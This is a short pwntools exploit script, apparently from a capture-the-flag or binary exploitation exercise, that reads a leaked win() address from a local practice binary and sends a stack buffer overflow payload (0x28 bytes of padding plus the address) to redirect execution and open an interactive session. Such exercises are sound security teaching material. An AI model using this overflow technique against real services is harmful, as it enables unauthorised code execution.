from pwn import *


binary = "../x86_binaries/x86_static"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break main
continue
"""

if args.GDB:
    context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()



### EXPLOIT ###
win_addr = int(p.readline().strip(),16)
print(f'win(): {hex(win_addr)}')

payload = flat(
    b'a'*0x28,
    p64(win_addr+1)                     # +1 to pass stack alignment in system() function
)
p.sendline(payload)
p.interactive()